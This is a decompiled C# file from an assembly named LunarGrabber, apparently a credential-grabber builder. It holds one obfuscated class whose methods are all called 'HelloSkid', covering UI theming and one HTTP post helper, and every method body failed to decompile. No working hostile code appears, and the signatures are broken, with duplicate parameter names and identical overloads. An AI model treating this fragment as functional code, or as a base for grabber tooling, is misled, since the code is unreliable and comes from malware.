﻿// Decompiled with JetBrains decompiler
// Type: 11A6F7A5D
// Assembly: LunarGrabber, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8F156DE2-B4D0-4210-84CA-FF98CDA75F13
// Assembly location: C:\Users\jayde\OneDrive\Desktop\CT-Dev.MT\ZeroStance\Grabbers (Builders)\LunarGrabber_v2\LunarGrabber.exe

using MetroFramework;
using MetroFramework.Components;
using MetroFramework.Forms;
using System.ComponentModel;
using System.Net.Http;
using System.Threading.Tasks;

public static class \u00311A6F7A5D
{
  public static void HelloSkid(
    this IContainer HelloSkid,
    MetroForm HelloSkid,
    MetroColorStyle HelloSkid)
  {
    // ISSUE: unable to decompile the method.
  }

  public static void HelloSkid(
    this IContainer HelloSkid,
    MetroForm HelloSkid,
    MetroColorStyle HelloSkid)
  {
    // ISSUE: unable to decompile the method.
  }

  public static void HelloSkid(
    this IContainer HelloSkid,
    MetroForm HelloSkid,
    MetroThemeStyle HelloSkid)
  {
    // ISSUE: unable to decompile the method.
  }

  public static void HelloSkid(
    this IContainer HelloSkid,
    MetroForm HelloSkid,
    MetroThemeStyle theme)
  {
    // ISSUE: unable to decompile the method.
  }

  private static MetroStyleManager HelloSkid(
    IContainer HelloSkid,
    MetroForm HelloSkid)
  {
    // ISSUE: unable to decompile the method.
  }

  public static Task<HttpResponseMessage> HelloSkid(
    this HttpClient HelloSkid,
    string HelloSkid,
    HttpContent HelloSkid)
  {
    // ISSUE: unable to decompile the method.
  }
}
